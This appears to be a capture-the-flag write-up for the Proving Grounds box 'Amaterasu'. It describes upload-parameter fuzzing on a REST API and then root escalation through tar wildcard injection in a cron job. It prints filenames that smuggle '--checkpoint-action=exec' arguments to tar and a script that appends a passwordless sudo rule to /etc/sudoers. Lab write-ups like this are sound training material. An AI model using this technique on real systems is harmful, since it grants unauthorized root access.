# Amaterasu -- Proving Grounds (write-up)

**Difficulty:** Medium
**Box:** Amaterasu (Proving Grounds)
**Author:** dkrxhn
**Date:** 2024-10-18

---

## TL;DR

### REST API file upload required specific parameter names (trial and error). Got a shell, then escalated via tar wildcard injection in a cron job to add sudo rights for the user.
---
## Target info

- Host: discovered via nmap
---
## Enumeration

![Nmap results](images/amaterasu-pg_1.png)

![Nmap continued](images/amaterasu-pg_2.png)

![Web enumeration](images/amaterasu-pg_3.png)

![Further enumeration](images/amaterasu-pg_4.png)

![API discovery](images/amaterasu-pg_5.png)

![API testing](images/amaterasu-pg_6.png)

---
## REST API file upload

![Upload attempt -- no "file"](images/amaterasu-pg_7.png)

Error said no "file" parameter.

![Include "file" parameter](images/amaterasu-pg_8.png)

Now says "no fileNAME" -- getting closer.

![Working upload](images/amaterasu-pg_9.png)

![Upload confirmed](images/amaterasu-pg_10.png)

![Shell access](images/amaterasu-pg_11.png)

![Initial shell](images/amaterasu-pg_12.png)

![User access](images/amaterasu-pg_13.png)

![Enumeration as user](images/amaterasu-pg_14.png)

---
## Privilege escalation -- tar wildcard injection

`tar` was missing a filepath in a cron job, so I created tar as an executable file in the listed filepath:

![Tar path](images/amaterasu-pg_15.png)

Can also take advantage of the wildcard by creating empty files with special names in the restapi directory:

![Wildcard injection](images/amaterasu-pg_16.png)

```bash
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privEsc.sh'
```

privEsc.sh contents:

![privEsc.sh](images/amaterasu-pg_17.png)

```bash
#!/bin/bash
echo 'alfredo ALL=(root) NOPASSWD: ALL' >> /etc/sudoers
```

Then `sudo su` for root access.

---
## Lessons & takeaways

- REST API file uploads often require specific parameter names -- fuzz them with different field names
- Tar wildcard injection with `--checkpoint` and `--checkpoint-action` is a reliable privesc when tar runs as root on a directory you control
- Creating files named as tar flags is a classic Unix trick
